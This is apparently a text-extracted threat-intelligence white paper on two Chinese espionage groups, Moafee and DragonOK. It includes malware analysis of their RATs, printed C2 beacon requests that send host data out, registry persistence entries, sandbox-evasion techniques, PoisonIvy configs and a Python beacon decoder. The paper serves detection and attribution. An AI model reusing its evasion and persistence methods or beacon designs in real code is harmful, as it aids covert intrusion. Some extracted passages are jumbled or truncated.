{
    "title": "wp-operation-quantum-entanglement",
    "text": "SECURITY  \nREIMAGINED\nWHITE PAPER\nOPERATION QUANTUM \nENTANGLEMENT   \nAuthors: Thoufique Haq, \nNed Moran, Sai Vashisht, and Mike Scott \n \nFireEye Labs2  www.fireeye.com\nFireEye:  Operation Quantum Entanglement CONTENTS\nIntroduction and Prior Research  ........................................................................................................................................................................................................................................................ 3\nAttack Methodology  ........................................................................................................................................................................................................................................................................................................... 4\n Attack vector  .......................................................................................................................................................................................................................................................................................................................... 4\n Decoy Behavior  ................................................................................................................................................................................................................................................................................................................ 4\n Evasion T echniques  ................................................................................................................................................................................................................................................................................................ 5\n CPU Core Check  ............................................................................................................................................................................................................................................................................................................ 5\n Password Protected Documents  ........................................................................................................................................................................................................................................ 7\n Large files  ......................................................................................................................................................................................................................................................................................................................................... 8\nBackdoor and RAT T ools  ............................................................................................................................................................................................................................................................................................ 9\n NewCT  ..................................................................................................................................................................................................................................................................................................................................................... 9\n Nflog  ........................................................................................................................................................................................................................................................................................................................................................ 15\n Sysget/HelloBridge  .......................................................................................................................................................................................................................................................................................... 17\n Mongall  .......................................................................................................................................................................................................................................................................................................................................... 17\n PoisonIvy  ..................................................................................................................................................................................................................................................................................................................................... 17\nThreat Actor Attribution  ................................................................................................................................................................................................................................................................................. 17\n Campaign #1: Moafee  .............................................................................................................................................................................................................................................................................. 17\n Campaign #2: DragonOK  ................................................................................................................................................................................................................................................................ 19\nAcknowledgements  ......................................................................................................................................................................................................................................................................................................... 20\nAppendix A: Python Routine to Decode NewCT and CT Beacons  .................................................................................................... 21\nAppendix B: Campaign codes embedded in NewCT/CT  ................................................................................................................................................ 22\nAppendix C: Moafee and DragonOK Clusters  ......................................................................................................................................................................................... 233  www.fireeye.com\nFireEye:  Operation Quantum Entanglement In the realm of quantum mechanics, entanglement \nis a peculiar phenomenon in which a pair of \nparticles takes on the properties of each other, regardless of the distance between them . Albert \nEinstein best described this intertwining \nphenomenon as “ spooky action at a distance”\n1. \nThis behavior is analogous to the observed correlation between the two geographically \nseparated attack groups detailed in this paper.\nWe have uncovered two distinct attack campaigns \noriginating from different geographic regions in China using similar tools, techniques and \nprocedures (TTPs). In both campaigns, each attack \ngroup employed multiple overlapping TTPs to infiltrate their targets, including similar custom \nbuilt backdoors and remote administration tools \n(RATs) such as CT/NewCT, Mongall and Nflog (and publicly available RATs such as PoisonIvy) to \nmaintain access to victim networks. We also observed the use of another custom backdoor called Sysget/HelloBridge by one of the attack \ngroups, which we believe is possibly shared \nbetween the campaigns as well. Both groups were also used a well-known proxy tool named HTRAN, \nwhich is an abbreviation for “ HUC Packet \nTransmit T ool”\n2 . This tool proxies connections \nthrough intermediate hops and aids the attackers \nin disguising their true geographical location when \ninteracting with the victim networks. We also observed both attack groups using similar \ntechniques to evade detection by security products. In sum, we believe that these groups are from two distinct regions in China and possibly (1) \nare collaborating , (2) received the same training, (3) have a common toolkit supply chain, or some \ncombination of these three. \nThe relationship between the two attack groups \nmay be direct or indirect, but based on our \ncurrent visibility, they seem to have two distinct missions, with each one targeting different \nindustries. We were able to ascertain the \ngeographical locations of the two attack groups by analyzing their “HTRAN” infrastructure over \na period of time. We believe a separate third \ngroup may also be employing these tools, but we do not have sufficient insight in to this \nadditional group at this time.\nThe attack group “Moafee” (named after their \ncommand and control infrastructure) appears \nto operate out of the Guangdong province in China and is known to target the governments \nand military organizations of countries with \nnational interests in the South China Sea. The seas in this region have multiple claims of \nsovereignty and hold high significance, as it is \nthe second busiest sea-lane in the world\n3  and \nare known to be rich in resources such as rare \nearth metals4 , crude oil, and natural gas5. We \nhave also observed the Moafee group target organizations within the US defense \nindustrial base. \n1 http://www.technologyreview.com/view/427174/einsteins-spooky-action-at-a-distance-paradox-\n2 http://www.secureworks.com/cyber-threat-intelligence/threats/htran/\n3 http://en.wikipedia.org/wiki/South_China_Sea#Resources\n4 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf \n5 http://www.eia.gov/countries/regions-topics.cfm?fips=scs\n4  www.fireeye.com\nFireEye:  Operation Quantum Entanglement The attack group “DragonOK” (named after an \nevent name in one of their payload executables 6) \nappears to operate out of the Jiangsu province \nin China, and is known to target high-tech and \nmanufacturing companies in Japan and T aiwan. The propensity to target these industries \npossibly demonstrates an interest in gaining \neconomic competitive advantage in the region through the acquisition of trade secrets .\nAttack Methodology:  \nAttack vector:The primary observed attack vector used by both \ngroups is spear-phishing emails. The themes--or \ntopics—used in the emails from the DragonOK group were well crafted and highly tailored to the \ntarget audience. We also found this attack group using the appropriate language for each of their targets in the phishing emails– such as Japanese \nand traditional Chinese (mainly used in T aiwan). The attachments in the email were typically an \nexecutable file embedded in a ZIP archive or \npassword-protected Microsoft Office documents. One such email, shown in Figure 2 and used by the \nDragonOK group was written in traditional \nChinese, and targeted a T aiwanese technology firm\nDecoy Behavior \nWe observed both attack groups employ decoy documents in order to help deceive potential \nvictims. The decoy documents are presented to \nthe victim while the malware runs in the background. One such Japanese-language decoy \ndocuments used by the “DragonOK” group is \n6 http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html\nFigure 1:  \nTwo attack \ngroups with common TTPs\nTaiwanJapanChina\nGuangdong\nProvinceJiangsu\nProvince\nU.S. DEFENSE\nREGIONAL CONFLICTSAdvanced cyber attack groups in the world's \nlargest manufacturing country are taking their \nexpertise in supply chain economics to the \nonline world. With a production line-like  \nsystem that enables joint attacks, the sharing \nof tools and techniques, and unified training, \nnew threat actors and malware are quickly produced to breach international and regional  \ncompanies alike.THE\nAD VANCED THREA T\nSUPPL Y CHAIN\nHow T oda y’s \nAttacks are \nManufacturedREGIONAL HIGH- TECH\nREGIONAL MANUF ACTURING\nPOSSIBLE SHARING OF T OOL  \nACROSS ATTACK GR OUPS 2Attacker training\ncoursesTools & technique s\nsharing centersPOSSIBLE ATTACKER SUPPL Y CHAIN  \nOR TRAINING REGIME N 1\nATTACK GR OUPS SEND MAL WA RE, \nSPEARPHISHING EMAILS, COMMAND  \nAND CONTR OL TO JAPAN AND T AIW AN,\nAS WELL AS THE REST OF THE WORLD35  www.fireeye.com\nFireEye:  Operation Quantum Entanglement shown below. It appears to be a resume of \nsomeone from Kyoto University in Japan who was \ninvolved in English language studies.\nEvasion T echniques: \nBoth attack groups employ numerous, yet \ncommon techniques in an attempt to evade detection by various sandbox environments, \nantivirus (AV) software, and gateway firewalls. We \nobserved environment-based evasion, the use of large file sizes, and password-protected documents – each of which are described in the \nsections below.\nCPU Core Check\nThe first-stage payload for RATs called “CT/\nNewCT” used by both the Moafee and DragonOK attack groups employs an evasive \n“CPU core check” technique. The payload \nattempts to detect the number of processor \nFigure 2:  \nEmail containing \n“888888” password in body with password-protected document attached \n6  www.fireeye.com\nFireEye:  Operation Quantum Entanglement cores in the running environment, by calling the \n\"GetSystemInfo\" API, which returns a structure \nwith system data, including number of cores. If \nonly one core is detected, it quits as seen in Figure 5. This probably is an attempt to detect \nvirtualized environments such as sandboxes, as well as other analysis environments used by \nreverse engineers, which often tend to be \nconfigured with a single core. \nWe also observed a similar evasion technique \nwithin the “Sysget/HelloBridge” payload \nFigure 3:  \nExample decoy \ndocument presented to the victim during a DragonOK phishing attack\n7  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Figure 4:  \nStructure returned by \nGetSystemInfo API\nemployed by the DragonOK group. It invokes \na similar call to “GetSystemInfo” to \ndetermine the number of active CPU cores, \nand the code quits if the system is configured with only one core.\nPassword Protected Documents:  \nThe “DragonOK” group in particular is known \nto use password-protected documents \ndelivered as attachments in emails, with the password listed in the contents of the email. This method probably is used to evade \ndetection by AV software, gateway firewalls \nand malware sandboxes. One such example using the password “888888” is shown in \nFigure 2 and Figure 6, and has been observed \nby FireEye\n7  before. Another similar sample \nwas referenced by the “contagio” blog8  and \nused the password “8861” . \n7 http://www.fireeye.com/blog/technical/malware-research/2013/02/hackers-targeting-taiwanese-technology-firm.html\n8 http://contagiodump.blogspot.com/2012/08/cve-2012-0158-generated-8861-password.html\nFigure 5:  \nEvasion based on \nCPU core detection\n8  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Figure 6:  \nPassword-protected \ndocument\nLarge files:  \nIn older phishing emails that link to the tools \nused by DragonOK and Moafee, we observed \nan implant over 10 megabytes in size. It was padded with unnecessary null bytes in the overlay section of the file, in order to increase the file size as shown in Figure 7. This probably \nwas done to evade detection, as many host-\nbased and network-based AV engines do not have the ability to scan large files.\n9  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Figure 7:  \nLarge null padded \noverlay section\nBackdoor and RAT T ools:  \n \nCT/NewCT  \n Dropper:\n \nThis is a first stage payload that  drops and runs the \nNewCT implant. The first stage payload (example: \n46e55cdf507ef10b11d74dad6af8b94e) attempts to detect the number of CPU cores in the running environment by calling GetSystemInfo  \nas described in the previous section. If the CPU core check detects more than one core, it implants \nthe NewCT2 RAT in %temp%\\MSSoap.DLL  \n(some variants will use BurnDCSrv.DLL and \nIntelAMTPP.DLL) and executes the written file. \nThe actual implant is packaged in the resource \nsection of the dropper with a fake bitmap (BMP) \nheader, as shown in Figure 8.10  www.fireeye.com\nFireEye:  Operation Quantum Entanglement The implant also creates a registry entry file called \nnamed “Windows.reg” and imports it the \ncontents of this file into the registry, using the \ncommand: “regedit.exe /s Windows.reg”.  These registry entries ensure startup persistence. The contents of \"Windows.reg\" is populated based on the Operating System (OS) which is determined \nby a call to the GetVersionEx API.\nIf “dwBuildNumber ” is equal to 2 (V ER_\nPLATFORM_WIN32_NT ) and “dwMajorVersion” is \nless than 6 (prior to Windows Vista) it adds \nfollowing entry for persistence:\n[HKEY_CLASSES_ROOT\\CLSID\\{fbeb8a05-\nbeee-4442-804e-409d6c4515e9}\\\nInProcServer32]  \n@=\"%Temp%\\MSSoap.DLL\"  \nOtherwise it creates a copy of itself to %Temp%\\\nWmiPrvSer.exe  and creates the following entry \nfor persistence:\nHKCU \\Software\\Microsoft\\Windows\\\nCurrentVersion\\Run\\\"dllhost\" = \n%Temp%\\WmiPrvSer.exeFigure 8:  \nDLL implant \nembedded in resource section with a fake BMP header\nFigure 9:  \nDLL implant embedded in resource section with a fake BMP headerBOOL WINAPI GetVersionEx(  \n  _Inout_  LPOSVERSIONINFO \nlpVersionInfo  \n); \n typedef struct _OSVERSIONINFO {  \n DWORD dwOSVersionInfoSize;  \n DWORD dwMajorVersion;  \n DWORD dwMinorVersion;  \n DWORD dwBuildNumber;  \n DWORD dwPlatformId;  \n TCHAR szCSDVersion[128];  \n} OSVERSIONINFO;11  www.fireeye.com\nFireEye:  Operation Quantum Entanglement We also found some clues in the binary that \nindicate that the tool was authored and built by \nsomeone using Chinese fonts on their computer. It \ncontains resource strings in English but the language is set to Chinese as shown below.Implant  \nThe implant (example: \nccff6e0a6f5e7715bdaf62adf0cbed4f) is \ncalled “NewCT/CT” RAT. The particular version we analyzed was NewCT version 2. The implant has \npersistence mechanisms and contains functionality \nto perform command and control communication. This backdoor also has functionality to load \nadditional plugins from the command and control \nserver. It exports the following two functions:  \n \nSendData  \nCreateInstance\nIt creates a mutex “ HFRM_” to ensure there is only \none running copy of the backdoor. It ensures this \nby checking if the return value from \nCreateMutexA  is 183 (\\xB7), which \ncorresponds to “ ERROR_ALREADY_EXISTS ”\n9.\nThe payload emits the “POST” network beacon \nshown below along with stub data. The header values are hardcoded in the payload, specifically \nthe values for “User-Agent” , “Cache-Control” and \nthe bytes at offset 0 of the stub (\\xcf\\xcf) may be of interest to network defenders.Figure 10:  \nEmbedded string \ntable in resource section with language set to Chinese\nFigure 11:  \nMutex usage and \nchecks to ensure one running copySTRINGTABLE  \nLANGUAGE LANG_CHINESE, 0x2  \n{ \n103,    “NewCT2”  \n106,    “Hello World!”  \n109,    “NEWCT2”  \n}\n9 http://msdn.microsoft.com/en-us/library/windows/desktop/ms681382%28v=vs.85%29.aspx\n12  www.fireeye.com\nFireEye:  Operation Quantum Entanglement POST / HTTP/1.1  \nAccept-Language: en-en  \nContent-Type: application/octet-\nstream \nPragma: no-cache  \nCache-Control: max-age=259200  \nConnection: Close  \nContent-Length: 1594  \nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1) \nHost: http.jpaols[.]com\\x0d\\x0a\\\nx0d\\x0a\\xcf\\xcf... The POST stub contains encrypted data. The encrypted data has two layers of abstraction. It is subjected to a bitwise NOT operation followed by \nencryption using a randomly generated 4-byte \nXOR key. The data within the POST stub is constructed in a buffer with a header at offset 0 (\\\nx30\\x30) followed by the remote sever, remote \nport, XOR encrypted data and function call location. The function call location is represented \nby the textual values shown in the table below and \nis selected using a switch case statement as shown in Figure 12. It is used by the attacker to track the \ncall path that resulted in the network beacon. The \nXOR encrypted data contains the MAC Address, hostname and campaign code.\n \nNumeric Representation T extual Representation\n0 index.asp\n1 index.php\n2 index.jsp\n3 index.css\n4 home.asp\nFigure 12:  \nCall path determined \nand embedded in network beacon\n13  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Figure 13:  \nEncrypted POST stub\nFigure 14:  \nPOST stub after \nbitwise NOT operation\nFigure 15:  \nEmbedded XOR \nencrypted data in POST stubT o elucidate the encryption scheme, let us go over a sample decryption process. The Figures 13 and 14 \nbelow shows data before and after a bitwise NOT operation.\nIn the resulting data after NOT operation, the XOR key is \\x30\\x30\\x34\\x31. When applied to the hex \ndata following it, we get the decrypted data below, which contains the MAC Address, hostname, and \ncampaign code. The Python routine to perform this decryption is included in Appendix A\nWe observed plugin functionality in the implant. It has the ability to load a DLL downloaded from the \nremote server, and calls the following export functions in the DLL:\nPlugin_GetID  \nPlugin_Init  \nPlugins_Start  \nPlugin_End\n14  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Figure 16:  \nDLL Plugin \nfunctionality allowing additional payloads to be loaded from the server\nThe call graph for this functionality is shown in \nFigure 16.\nNewCT RAT evolved from older versions called \n“CT” , which has been observed being used in \nassociation with the “Nflog” Backdoor. The \nfollowing password-protected document (46ac122183c32858581e95ef40bd31b3 ) \ncreates a DLL implant called IntelAMTPP .dll (ebd1f5e471774bb283de44e121efa3e5 ), \nwhich is the “CT” RAT. In this case, the “CT” implant is 10 MB in size, as it has padded null bytes at the end of the file to increase file size in a possible \nattempt to evade AV engines as described in the \nprevious section on evasion techniques. The “CT” implant has identical functionality to “NewCT” , as \nobserved from the embedded strings.\n00005A58  Connection:close  \n00005A6C  Cache-Control: max-\nage=259200  \n00005A8C  Pragma: no-cache  \n00005AA0  Mozilla/4.0 (compatible; \nMSIE 6.0;Windows NT 5.1)  \n00005AD4  Content-Type: application/\noctet-stream  \n00005AFC  image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /  \n00005B38  Accept-Language: en-en  00005B50  %s%02x  \n00005B5C  home.asp  \n00005B68  index.css  \n00005B74  index.jsp  \n00005B80  index.php  \n00005B8C  index.asp  \n00005EFC  ct.datangcun.com  \n00005F3C  ct.datangcun.com  \n00005F7C  20120509  \n00005F8C  CT V2.1  \n00006374  Plugin_End  \n00006380  Plugin_Start  \n00006390  Plugin_Init  \n0000639C  Plugin_GetID\n \nThis version was called “CT V2.1” by the author, \nwhich may indicate that there were other earlier versions of this RAT and that it was improved \nupon incrementally. One of the command and \ncontrol servers used by a variant of this implant is aptly named “ct.datangcun[.]com”. We do not believe either Moafee or DragonOK have \ncontrolled the domain “ct.datangcun[.]\ncom” , but it was probably controlled by a third group which also used the implant in a separate \ncampaign. The network beacon for version 2.1 is \nshown below; it uses the same encryption scheme as “NewCT”:\n15  www.fireeye.com\nFireEye:  Operation Quantum Entanglement POST / HTTP/1.1  \nAccept-Language: en-en  \nContent-Type: application/oc -\ntet-stream  \nPragma: no-cache  \nCache-Control: max-age=259200  \nContent-Length: 1572  \nUser-Agent: Mozilla/4.0 (compati -\nble; MSIE 6.0;Windows NT 5.1)  \nHost: ct.datangcun[.]com:1353\\x0d\\\nx0a\\x0d\\x0a\\xcf\\xcf  \n We also observed both attack groups using  campaign codes within this implant and which are listed in Appendix B.  The campaign codes re -\nferred to victim countries, attack dates, command and control infrastructure, and other operational codes – which remain undeciphered.  \nNflog  \nWe have observed DragonOK and Moafee use the Nflog implant in addition to an earlier version of the NewCT2 implant.  The pass -\nword-protected XLS document ( 46ac-\n122183c32858581e95ef40bd31b3 ) ref-\nerenced earlier also drops an “Nflog” implant (a3d3b0686e7bd13293ad0e63ebec67af ) \nin addition to ….. The “Nflog” implant emits the following network beacon format:  \nPOST /NfLog/Nfile.asp HTTP/1.1  \nAccept: */*  \nUser-Agent: Mozilla/5.0 (compati -\nble; MSIE 7.0;Windows NT 5.1)  \nHost:  \nContent-Length: 0  \nCache-Control: no-cache  \n POST /NfLog/NfStart.asp?Clien -\ntId={LocalIP}%20<49d0>%20{Ex -\nternalIP}&Nick={Identifier}&d -time=T:8-6-0-53 HTTP/1.1Accept: */*Use-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)Host: Content-Length: 36Cache-Control: no-cacheCookie: ASPSESSIONIDACCARCDD=OKNPG -\nCKDLEKEHBOHIHLCOMHD\nWe have observed the use of a newer variant of \nNflog (example: 3eab5e12f99b47e822721e -\n93639ba1d1 ) being employed in attacks, which \nhas the beacon format shown below:  \n POST /windowsxp/SNews.asp?HostID={ -\nMAC Address} HTTP/1.1Accept: /Cache-Control: no-cacheUser-Agent: Mozilla/4.0 (compati -\nble; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)Host: Content-Length: 126Connection: CloseCookie: ASPSESSIONIDAARSSTTB=ECD -\nDKIAAOHGODEKKFGOKNJCD\nOther URI formats it uses are as follows:\n/windowsxp/SSports.asp?HostID=/windowsxp/SWeather.asp?HostID=/windowsxp/SJobs.asp?HostID=/windowsxp/STravel.asp?HostID=/windowsxp/NfHostInfo.asp?NickId=/windowsxp/SGames.asp?HostID=\nNote the same User-Agent “ Mozilla/4.0 \n(compatible; MSIE 6.0; Windows NT \n5.0; .NET CLR 1.1.4322 )” is used by both 16  www.fireeye.com\nFireEye:  Operation Quantum Entanglement the older and newer version of “Nflog” samples. We also found code-level similarities in the network \ncommunication function code, as well as the data collection function code shown in Figure 17. This strongly suggests that it is an updated version of the “Nflog” backdoor.\nFigure 17:  \nIdentical data \ncollection function seen in both older and newer Nflog variants17  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Sysget/HelloBridge\nThis tool has recently been analyzed by Secure-works \n10. We observed the DragonOK attacker \nemploy this tool against targets in Japan and \nT aiwan (e.g. 57e3d002542e07f2eb09fd2b1b0ee -\nab2), as also noted by Secureworks. We have \nnot yet seen the Moafee group use this tool. This implant has the following beacon format: \n \nGET /el/sregister.php?name=[REDACTED] \nHTTP/1.1User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)Host: 122.10.62.137Connection: Keep-AliveOther URI formats include:\n/el/slogin.php?uid=\n/el/suploadfile.php?item=/el/suploadfile.php Mongall \nFireEye has previously analyzed this backdoor\n11, \nwhich is used by multiple other groups in addition \nto DragonOK and Moafee. DragonOK in partic -\nular is known to frequently use this implant (e.g. e8d77d19e1c6f462f4a5bf6fbe673a3c ), \nwhich has the following network beacon format: GET /3000FC080000[REDACTED 00000000 0000000000000000000000000000000000 0000000000000000000000000000000000 0000000000000000000000000000000000 00100000[REDACTED]0000000000000000 0000000000000000000000000000000000 0000000000000000[REDACTED]000000 HTTP/1.1 User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)Host: mail.jpaols[.]com:443Cache-Control: no-cache  PoisonIvy  \nThis is a publicly available RAT used by multiple \nthreat actors, which has been extensively analyzed \nin a previous FireEye white paper\n12.  The ex-\ntracted configuration blocks from a \"DragonOK\" PoisonIvy variant ( 65fcc9b9ff608801edc -\n697552438cfee ), is shown below:\nID: ftp \nDomains: ftp.skydnastwm.com:15836|  \nPassword: Ecp982*@Me2  \nMutex: fftp  \n In contrast, here is an extracted PoisonIvy \nconfiguration block from a \"Moafee\" instance (9ebe86a648b1f19836251f946a160b16), \nas shown below:\nID:  \nDomains: afp.mozjlla.com|  \nPassword: 741526  \nMutex: )!afpA.I4  \n \nThreat Actor Attribution  \n \nCampaign #1: Moafee  \nWe have observed the Moafee group target the governments and militaries of countries with national interests in the South China Sea. We have \nalso observed this group target companies within \nthe US defense industrial base.\nAs discussed, we have observed the Moafee group \nuse a number of different tools including Poison Ivy, Nflog, Mongall, and NewCT2.\nWe found this group running HTRAN on one of \ntheir front-end command and control servers. The \ncommand and control server in question was \n10 http://www.secureworks.com/resources/blog/research/hellobridge-trojan-uses-heartbleed-news-to-lure-victims/\n11 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-\nmalaysian-flight-mh-370.html\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\n13 http://en.wikipedia.org/wiki/South_China_Sea#Resources\n14 http://www.ifri.org/downloads/ifricanonopedseamanecs.pdf\n15 http://www.eia.gov/countries/regions-topics.cfm?fips=scs\n18  www.fireeye.com\nFireEye:  Operation Quantum Entanglement located at 58.64.201.229 . We monitored this \nserver for two months, from January to March \nthis year. During this time period, we observed the \nfollowing domains resolving to 58.64.201.229 :\n ph.moafee[.]com  \nafp.mozjlla[.]com  \nmofa.mozjlla[.]com  \nacer.moafee[.]com  \ndel.moafee[.]com  \njnt.moafee[.]com  \npcg.moafee[.]com  \nsslc.moafee[.]com  \n at.moafee[.]com  \n lw.moafee[.]com  \n ks.moafee[.]com   oa.moafee[.]com  \n xxpp.moafee[.]com  \n hp.moafee[.]com  \n gumm.mozjlla[.]com  \n msn.moafee[.]com  \n During this same time frame, the HTRAN client at 58.64.201.229 was observed \nattempting to connect to a number of different backend HTRAN servers. All of these HTRAN servers were located in the Guangdong \nProvince and operated by CHINANET.\nAdditionally, the Moafee group also hosted a PoisonIvy command and control server at phi.\ncrabdance[.]com . Between April 30, 2012 \n \nDATE CNC HTRAN BackendHTRAN Backend \nGeolocation\n2014-03-15 58.64.201.229 169.254.163.19 LINK LOCAL\n2014-03-02 58.64.201.229 113.65.22.148CHINANET GUANGDONG \nPROVINCE NETWORK\n2014-02-22 58.64.201.229 169.254.61.191 LINK LOCAL\n2014-02-18 58.64.201.229 113.68.111.111CHINANET GUANGDONG PROVINCE NETWORK\n2014-02-15 58.64.201.229 113.68.108.62CHINANET GUANGDONG PROVINCE NETWORK\n2014-02-12 58.64.201.229 113.68.168.73CHINANET GUANGDONG PROVINCE NETWORK\n2014-02-02 58.64.201.229 169.254.92.25 LINK LOCAL\n2014-01-30 58.64.201.229 113.65.43.42CHINANET GUANGDONG PROVINCE NETWORK\n2014-01-27 58.64.201.229 113.66.12.112CHINANET GUANGDONG PROVINCE NETWORK\n2014-01-25 58.64.201.229 113.65.41.28CHINANET GUANGDONG PROVINCE NETWORK\n2014-01-20 58.64.201.229 113.68.171.67CHINANET GUANGDONG PROVINCE NETWORK\n2014-01-15 58.64.201.229 113.68.110.239CHINANET GUANGDONG PROVINCE NETWORK\n13 http://www.fireeye.com/blog/technical/malware-research/2014/03/spear-phishing-the-news-cycle-apt-actors-leverage-interest-in-the-disappearance-of-\nmalaysian-flight-mh-370.html\n12 http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf\n19  www.fireeye.com\nFireEye:  Operation Quantum Entanglement and July 1, 2012, the phi.crabance[.]com domain \nresolved to 98.126.91.66.  This IP was \nobserved hosting a HTRAN proxy client, which was seen connecting to a backend HTRAN server hosted at 113.66.248.60 . This server was also \nlocated in the Guangdong Province and operated by CHINANET.\nIn short, the Moafee group was observed \nconsistently hosting their backend HTRAN servers in Guangdong. This observation may \nreveal that the Moafee group is physically located \nin this province.\nCampaign #2: DragonOK  \nWe have observed the DragonOK group \ntarget high-technology and manufacturing \ncompanies in both Japan and T aiwan. This \ngroup has used similar malware to the Moafee group described above. Specifically, we \nobserved DragonOK employing PoisonIvy, \n2013-10-04. The following other domains were seen resolving to this same IP:\nThe DragonOK group was observed hosting their backend HTRAN servers in Jiangsu. This \nobservation may reveal that the DragonOK group is physically located in the Jiangsu province.Nflog, Mongall, CT, and NewCT.\nLike the Moafee group, we observed the \nDragonOK group running an HTRAN proxy client on one of their front-end command \nand control servers. For approximately one \nweek, between July 31, 2013 and August 8, 2013, the domain www.ndbssh[.]com served \nas a command and control server for \nMongall payloads distributed by the DragonOK group. During this time, \nDragonOK also ran an HTRAN proxy client \non www.ndbssh[.]com.\nThis HTRAN client was seen attempting to connect to three different HTRAN servers located in the Jiangsu province and operated \nby CHINANET.\nThe domain www.ndbssh[.] com resolved to \n206.161.216.219  between 2013-09-28 and \n \nDATE CNC HTRAN BackendHTRAN Backend \nGeolocation\n2013-08-05 www.ndbssh.com 58.217.168.205CHINANET JIANGSU \nPROVINCE NETWORK\n2013-08-04 www.ndbssh.com 222.95.171.178CHINANET JIANGSU PROVINCE NETWORK\n2013-07-31 www.ndbssh.com 58.217.169.95CHINANET JIANGSU \nPROVINCE NETWORK\n \nDATE CNC Domain\n2013-08-20 www.ghostale[.]com\n2013-09-06 www.ycbackap[.]com\n2013-12-20 asp.skyppee[.]com\n2013-12-20 facebook.skyppee[.]com\n2013-12-20 pop.skyppee[.]com\n2013-12-20 mail.skyppee[.]com\n2013-12-20 mil.skyppee[.]com\n2013-12-20 web.pktmedia[.]com\n2013-12-20 bbs.pktmedia[.]com20  www.fireeye.com\nFireEye:  Operation Quantum Entanglement 21 http://technet.microsoft.com/en-us/library/hh849687.aspx\n22 http://technet.microsoft.com/en-us/library/hh847739.aspx\nConclusion  \nBased on the geolocation evidence provided \nin this paper, it appears that different \noperators executed the Moafee and DragonOK campaigns. This conclusion is \nsupported by the following assessments:\n• The campaigns target different industries in \ndifferent geographic locations. The Moafee \ncampaign targets government and military organizations in countries with national \ninterests in the South China Sea. In contrast, \nthe DragonOK campaign has been observed targeting high-technology and manufacturing \ncompanies in Japan and T aiwan. \n• The campaigns maintain separate back-end command and control infrastructures hosted \nin different provinces in Mainland China. The Moafee campaign can be traced to \ninfrastructure located in the Guangdong \nprovince, whereas the DragonOK campaign can be traced to infrastructure located in the \nJiangsu province.\nWhile it seems that different operators are responsible for these two campaigns, our \nresearch showed that these operators share a number of common tools, techniques and \nprocedures (TTPs). We also believe a separate \nthird group is using these TTPs but we do not have sufficient insight to this operator at this \ntime. The shared TTPs include:• Usage of the same custom backdoors and \nRATs such as CT/NewCT/NewCT2, \nMongall, Nflog, as well as off-the-shelf \nRATs such as PoisonIvy, to maintain access to the victims’ networks. \n• Usage of HTRAN to proxy their command and control communication.\n• Usage of the same evasion techniques to evade detection such as environment \nchecks based on CPU cores, password \nprotected documents, and the use of large null padded files.\nWe assess that these shared TTPs may be the result of:\n• A direct relationship between the operators.\n• An indirect relationship such as the \ncompletion of a common training regimen.\n• A common quartermaster or supply-chain for their malware tools.  \nAcknowledgements:  \nWe would like to thank Ronghwa Chong, Nart \nVilleneuve, Darien Kindlund, Kenneth Gears \nand Jonathan Wrolstad for their insight, research and support.21  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Appendix A: Python Routine to Decode NewCT and CT Beacons  \ndef dexor(data,key):  \n buffer = “”  \n keylen = len(key)  \n for i in range(0,len(data)):  \n  buffer += chr(ord(data[i]) ^ ord(key[i % keylen]))  \n return buffer\ndef decrypt(data):  \n inverted = “”  \n for byte in data:  \n  try: \n   inverted += chr(~ord(byte) & 0xFF)  \n  except:  \n   continue  \n beacon = “\\\\x” + “\\\\x”.join(“{0:x}”.format(ord(c)) for c in \ninverted[0:4])  \n end_marker = “index”  \n end = inverted.find(end_marker,0) + len(end_marker) + 4  \n values = inverted[:end].split(‘/’)  \n if len(values) < 7:  \n  return 0  \n key = values[1]  \n data1 = binascii.unhexlify(values[3].replace(‘%’,”))  \n data2 = binascii.unhexlify(values[5].replace(‘%’,”))  \n c2_end = values[0].find(‘\\x00’) - 1  \n c2 = values[0][4:c2_end]  \n  return beacon + “|” + c2 + “|” + dexor(data1,key) + “|” +  \ndexor(data2,key) + “|” + values[6]22  www.fireeye.com\nFireEye:  Operation Quantum Entanglement Appendix B: Campaign codes embedded in NewCT/CT\n \nFirst stage payload Version Implant Implant Name C2 Server Campaign code\n46e55cdf507ef10b  \n11d74dad6af8b94eNewCT281998ee8b8f8304d  \n038e3cb5ff10b4d2MSSoap.DLLhttp.jpaols[.]\ncomhc_NewCT\n989d04ab23385260  \na402ce7b6751e60eNewCT281998ee8b8f8304d  \n038e3cb5ff10b4d2MSSoap.DLLfacebook.pktmedia[.]com\nfacebook.\nskyppee[.]comface_NewCT\n6de67d5bfe61fbdc  \n2febfd289e9660c3NewCT281998ee8b8f8304d  \n038e3cb5ff10b4d2MSSoap.DLLhttp.jpaols[.]comjp80_NewCT\n908d847fd39a2851  \n85b3f0e8dc874dadNewCT281998ee8b8f8304d  \n038e3cb5ff10b4d2MSSoap.DLLsslc.moafee[.]comsslc_NewCT\n26a48ee15b8f976d  \nb35e219428e05ef3NewCT281998ee8b8f8304d  \n038e3cb5ff10b4d2MSSoap.DLLhttp.jpaols[.]\ncomjp80_NewCT\nbd5ed9168632e6da  \na6bcee6b6c48d60fNewCT281998ee8b8f8304d  \n038e3cb5ff10b4d2BurnDCSrv.  \nDLLbutitistrun.\nblogdns[.]comlcl918_NewCT\n46ac122183c32858  \n581e95ef40bd31b3CT V2.181998ee8b8f8304d  \n038e3cb5ff10b4d2IntelAMTPP.  \ndllct.datangcun[.]\ncom20120509_CT 